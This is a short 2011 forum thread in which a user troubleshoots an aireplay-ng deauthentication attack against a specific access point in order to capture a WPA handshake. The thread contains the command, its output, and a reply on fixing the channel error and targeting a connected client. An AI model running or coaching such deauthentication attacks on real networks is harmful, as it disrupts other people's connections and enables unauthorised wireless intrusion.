---
title: "A problem with Aireplay-ng !"
date: 2011-07-02
forum: New to Ubuntu
---

### Post by kareem50 on 2011-07-02
I'm trying to make a handshake using the Airyplay-ng 
and that step is locking me !


[COLOR="Red"]root@bt:~# aireplay-ng -0 1 -a 00:23:69:78:E0:43 mon0 --ignore-negative-one[/COLOR]
09:28:53 Waiting for beacon frame (BSSID: 00:23:69:78:E0:43) on channel -1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
09:28:53 Sending DeAuth to broadcast -- BSSID: [00:23:69:78:E0:43]


any suggestions:( ?

---

### Post by Dangertux on 2011-07-02
Disconnect from any other network you're connected to before doing this. It will stop the negative 1

Second add -c and a Mac that is associated with the ap

Alternatively you can just wait for a client to deauth normally

---

